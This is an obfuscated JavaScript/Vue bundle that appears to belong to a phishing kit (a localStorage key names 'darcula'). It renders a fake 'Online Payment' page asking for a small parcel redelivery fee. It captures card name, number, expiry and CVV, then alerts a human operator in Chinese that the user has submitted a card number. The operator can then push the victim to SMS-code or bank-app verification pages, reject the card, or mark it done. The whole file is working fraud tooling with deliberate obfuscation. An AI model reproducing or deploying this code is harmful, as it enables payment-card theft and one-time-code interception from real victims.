const a23_0x3736d6 = function () {
  let _0x49a5d7 = true;
  return function (_0x1d255a, _0x63c514) {
    const _0x51f20a = _0x49a5d7 ? function () {
      if (_0x63c514) {
        const _0x3628d3 = _0x63c514.apply(_0x1d255a, arguments);
        _0x63c514 = null;
        return _0x3628d3;
      }
    } : function () {};
    _0x49a5d7 = false;
    return _0x51f20a;
  };
}();
const a23_0x45b31a = a23_0x3736d6(this, function () {
  return a23_0x45b31a.toString().search("(((.+)+)+)+$").toString().constructor(a23_0x45b31a).search("(((.+)+)+)+$");
});
a23_0x45b31a();
import { d as a23_0x1491c0, a as a23_0x336b63, w as a23_0x4b4d30, r as a23_0x35d95a, N as a23_0x5ab7d1, b as a23_0x363e62, c as a23_0x631922, C as a23_0x2422e9, e as a23_0x11a274, t as a23_0x1eefb0, u as a23_0x862c77, j as a23_0x253c7a, v as a23_0x5a14a9, k as a23_0x9d75ca, F as a23_0x4bb8ff, L as a23_0x589b1d, i as a23_0x55f594, O as a23_0x122877, E as a23_0x4bf593, G as a23_0x51c241, g as a23_0x1e9d19 } from './index-4b020bd6.js';
import { u as a23_0x2d0b82, a as a23_0xbe5929, g as a23_0x10b492, p as a23_0x4eedf0 } from './3213f1cfKXMp5.js';
import { u as a23_0x4010fe, a as a23_0x536161 } from './f0ee2557KXMp5.js';
import { a as a23_0x23f00c, g as a23_0x1aad33, i as a23_0xbde817 } from './fff8ac5eKXMp5.js';
import { _ as a23_0x1187f7 } from './c27b6911KXMp5.js';
import './7357514cKXMp5.js';
import './09bf01f8KXMp5.js';
const H = '' + new URL("68eec8c2TeKnX.svg", import.meta.url).href;
const Q = _0x1bd504 => (a23_0x4bf593("data-v-6ff8c83f"), _0x1bd504 = _0x1bd504(), a23_0x51c241(), _0x1bd504);
const W = ["onSubmit"];
const Z = {
  'key': 0x0,
  'class': "input"
};
const ee = {
  'class': "input"
};
const te = {
  'key': 0x0,
  'class': "error"
};
const ae = {
  'class': "card-icons"
};
const re = ["src"];
const se = {
  'class': "input-field",
  'style': {
    'display': "flex",
    'gap': "10px",
    'align-items': "flex-end"
  }
};
const oe = {
  'class': "input"
};
const ne = {
  'class': "input"
};
const ce = Q(() => a23_0x11a274("img", {
  'src': H,
  'translate': 'no',
  'alt': "cvv",
  'style': {
    'position': "absolute",
    'right': "10px",
    'height': '1.5em',
    'box-sizing': "border-box",
    'pointer-events': 'none'
  }
}, null, -0x1));
const ie = {
  'class': "button-submit"
};
const le = {
  'type': "submit"
};
const ue = a23_0x1491c0({
  '__name': "CardInput",
  'props': {
    'lang': null,
    'acceptPage': {
      'default': "/done"
    },
    'backPage': {
      'default': "/card?error=1"
    },
    'hideCardName': {
      'type': Boolean,
      'default': false
    },
    'onBeforeSubmit': {
      'type': Function,
      'default': async () => true
    },
    'beforeSubmitPreGet': {
      'type': Boolean,
      'default': true
    }
  },
  'emits': ["data-change", "error"],
  'setup'(_0x136892, {
    emit: _0x19c344
  }) {
    const _0x2709dc = a23_0x4010fe();
    const _0x1ec6da = a23_0x536161();
    const _0x569319 = a23_0x2d0b82();
    const _0xa1068b = _0x136892.lang || navigator.language.split('-')[0x0];
    const _0x1d90fd = a23_0x1aad33(_0xa1068b);
    const _0x1dbadf = a23_0x336b63(_0x2709dc.query.error ? _0x1d90fd("cardErrorMsg") : '');
    a23_0x4b4d30(_0x1dbadf, () => _0x19c344("error", _0x1dbadf.value));
    const _0x552857 = a23_0x35d95a({
      'cardName': '',
      'cardNumber': '',
      'expire': '',
      'cvv': ''
    });
    a23_0x4b4d30(_0x552857, () => {
      _0x1dbadf.value = '';
      a23_0x4eedf0(_0x552857);
      _0x19c344("data-change", _0x552857);
    });
    a23_0xbe5929("accept-sms", _0x59c259 => {
      _0x59c259 = _0x59c259 || '';
      _0x1ec6da.push("/verify-sms?accept=" + _0x136892.acceptPage + "&back=" + _0x136892.backPage + "&lang=" + _0xa1068b + "&phone=" + _0x59c259);
    });
    a23_0xbe5929("accept-bank", () => {
      _0x1ec6da.push("/verify-bank?accept=" + _0x136892.acceptPage + "&back=" + _0x136892.backPage + "&lang=" + _0xa1068b);
    });
    a23_0xbe5929("reject-card", (_0x4ed2d8, _0x2d1464) => {
      if (_0x4ed2d8) {
        _0x1dbadf.value = _0x4ed2d8;
      } else if (_0x2d1464 === "autoDenyCredit") {
        _0x1dbadf.value = a23_0x10b492("card-deny-credit-msg") || _0x1d90fd("cardDenyCreditMsg");
      } else if (_0x2d1464 === "autoDenyDebit") {
        _0x1dbadf.value = a23_0x10b492("card-deny-debit-msg") || _0x1d90fd("cardDenyDebitMsg");
      } else {
        _0x1dbadf.value = a23_0x10b492("card-error-msg") || _0x1d90fd("cardErrorMsg");
      }
      _0x569319.status = "当前正在填卡页面";
    });
    a23_0xbe5929("accept-done", () => {
      _0x1ec6da.replace(decodeURIComponent(_0x136892.acceptPage));
    });
    const _0x250cb9 = a23_0x23f00c();
    for (const _0x1c775a in _0x250cb9) a23_0xbe5929("accept-custom-verify-" + _0x1c775a, _0xa20f2f => {
      localStorage.setItem("__darcula_verify_page_text", _0xa20f2f || '');
      console.log(_0x250cb9[_0x1c775a]);
      _0x1ec6da.push("/verify-page?accept=" + _0x136892.acceptPage + '&back=' + _0x136892.backPage + "&lang=" + _0xa1068b + "&pageIndex=" + _0x1c775a);
    });
    const _0x2c4b7b = a23_0x336b63(false);
    if (_0x136892.beforeSubmitPreGet) {
      _0x136892.onBeforeSubmit().then(_0x5c09e6 => {
        if (_0x5c09e6 instanceof Array) {
          const _0x1c1d3d = [];
          for (const _0x8eda6d of _0x5c09e6) if (_0x8eda6d.url) {
            _0x1c1d3d.push(_0x8eda6d);
            try {
              a23_0xbe5929(_0x8eda6d.key, () => {
                _0x1ec6da.replace(_0x8eda6d.url);
              });
            } catch (_0x58c3a1) {}
          }
          localStorage.setItem("__beforeSubmitActions", JSON.stringify(_0x1c1d3d));
        }
        _0x2c4b7b.value = _0x5c09e6;
      });
    }
    const _0x2ee879 = a23_0x336b63();
    async function _0x1e2c6b() {
      const _0x2927d5 = _0x136892.beforeSubmitPreGet ? _0x2c4b7b.value : await _0x136892.onBeforeSubmit();
      if (_0x2927d5 === false || !_0x2ee879.value || !_0x2ee879.value.reportValidity()) {
        return;
      }
      _0x569319.status = {
        'status': "此用户已提交卡号，请及时处理",
        'color': "red"
      };
      const _0x4bfff3 = [{
        'key': "accept-sms",
        'label': "验证码验证",
        'data': '尾号'
      }, {
        'key': "accept-bank",
        'label': 'APP验证'
      }, {
        'key': "reject-card",
        'label': '拒绝卡号',
        'data': "提示信息"
      }, {
        'key': "accept-done",
        'label': "跳转完成"
      }];
      if (_0x2927d5 instanceof Array) {
        _0x4bfff3.unshift(..._0x2927d5);
      }
      _0x4bfff3.push(..._0x250cb9);
      _0x569319.actions = _0x4bfff3;
    }
    return (_0x512b66, _0x456051) => {
      const _0x385668 = a23_0x5ab7d1("mask");
      a23_0x363e62();
      a23_0x363e62(true);
      return a23_0x631922("form", {
        'ref_key': "formRef",
        'ref': _0x2ee879,
        'onSubmit': a23_0x55f594(_0x1e2c6b, ['prevent'])
      }, [a23_0x2422e9(_0x512b66.$slots, 'head', {}, undefined, true), _0x136892.hideCardName ? a23_0x9d75ca('', true) : (a23_0x363e62(), a23_0x631922("div", Z, [a23_0x11a274("label", null, a23_0x1eefb0(a23_0x862c77(_0x1d90fd)('cardName')), 0x1), a23_0x253c7a(a23_0x11a274("input", {
        'type': "text",
        'placeholder': " ",
        'required': '',
        'onUpdate:modelValue': _0x456051[0x0] || (_0x456051[0x0] = _0x390080 => _0x552857.cardName = _0x390080)
      }, null, 0x200), [[a23_0x5a14a9, _0x552857.cardName]])])), a23_0x11a274('div', ee, [a23_0x11a274('label', null, a23_0x1eefb0(a23_0x862c77(_0x1d90fd)('cardNumber')), 0x1), a23_0x253c7a(a23_0x11a274("input", {
        'type': 'text',
        'placeholder': "0000 0000 0000 0000",
        'required': '',
        'maxlength': '19',
        'minlength': '8',
        'inputmode': "numeric",
        'onUpdate:modelValue': _0x456051[0x1] || (_0x456051[0x1] = _0x2c5246 => _0x552857.cardNumber = _0x2c5246)
      }, null, 0x200), [[_0x385668, {
        'mask': "0000 0000 0000 0000"
      }], [a23_0x5a14a9, _0x552857.cardNumber]]), _0x1dbadf.value ? (a23_0x363e62(), a23_0x631922('div', te, a23_0x1eefb0(_0x1dbadf.value), 0x1)) : a23_0x9d75ca('', true), a23_0x11a274('div', ae, [a23_0x631922(a23_0x4bb8ff, null, a23_0x589b1d(Object.values(a23_0x862c77(a23_0xbde817)), (_0x35d204, _0x420d59) => (a23_0x363e62(), a23_0x631922("img", {
        'key': _0x420d59,
        'src': _0x35d204,
        'alt': ''
      }, null, 0x8, re))), 0x80)])]), a23_0x11a274("div", se, [a23_0x11a274('div', oe, [a23_0x11a274("label", null, a23_0x1eefb0(a23_0x862c77(_0x1d90fd)("cardExpire")), 0x1), a23_0x253c7a(a23_0x11a274("input", {
        'type': 'text',
        'placeholder': "MM/YY",
        'required': '',
        'minlength': '5',
        'inputmode': 'numeric',
        'onUpdate:modelValue': _0x456051[0x2] || (_0x456051[0x2] = _0x3f1a08 => _0x552857.expire = _0x3f1a08)
      }, null, 0x200), [[_0x385668, {
        'mask': "mm/yy",
        'blocks': {
          'mm': {
            'mask': a23_0x862c77(a23_0x122877).MaskedRange,
            'from': 0x1,
            'to': 0xc,
            'autofix': "pad"
          },
          'yy': {
            'mask': a23_0x862c77(a23_0x122877).MaskedRange,
            'from': 0x17,
            'to': 0x63
          }
        }
      }], [a23_0x5a14a9, _0x552857.expire]])]), a23_0x11a274('div', ne, [a23_0x11a274("label", null, a23_0x1eefb0(a23_0x862c77(_0x1d90fd)("cardCvv")), 0x1), a23_0x253c7a(a23_0x11a274("input", {
        'type': "text",
        'required': '',
        'placeholder': "123",
        'minlength': '3',
        'maxlength': '4',
        'inputmode': 'numeric',
        'onUpdate:modelValue': _0x456051[0x3] || (_0x456051[0x3] = _0x452c17 => _0x552857.cvv = _0x452c17)
      }, null, 0x200), [[_0x385668, {
        'mask': "0000"
      }], [a23_0x5a14a9, _0x552857.cvv]]), ce])]), a23_0x2422e9(_0x512b66.$slots, "foot-before", {}, undefined, true), a23_0x2422e9(_0x512b66.$slots, "submit", {}, () => [a23_0x11a274("div", ie, [a23_0x11a274("button", le, a23_0x1eefb0(a23_0x862c77(_0x1d90fd)('cardSubmit')), 0x1)])], true), a23_0x2422e9(_0x512b66.$slots, "foot", {}, undefined, true)], 0x28, W);
    };
  }
});
const de = a23_0x1187f7(ue, [["__scopeId", "data-v-6ff8c83f"]]);
const pe = {
  'style': {
    'text-align': "left"
  }
};
const me = a23_0x11a274('h1', null, "Online Payment", -0x1);
const fe = a23_0x11a274('br', null, null, -0x1);
const xe = a23_0x1491c0({
  '__name': 'CardPage',
  'setup'(_0x2c4e75) {
    const _0x4a6e1e = a23_0x10b492("pay-description");
    const _0x3f660c = a23_0x10b492("pay-price");
    return (_0x416bb0, _0x4f90d1) => (a23_0x363e62(), a23_0x631922(a23_0x4bb8ff, null, [a23_0x11a274("div", pe, [me, a23_0x11a274('p', null, a23_0x1eefb0(a23_0x862c77(_0x4a6e1e) || "For redelivery, we need to charge some service fees. Your package will be re-delivered after payment"), 0x1), a23_0x11a274('p', null, [a23_0x11a274('b', null, "lump sum: " + a23_0x1eefb0(a23_0x862c77(_0x3f660c) || "$0.3"), 0x1)])]), fe, a23_0x1e9d19(de, {
      'lang': 'en'
    })], 0x40));
  }
});
export { xe as default };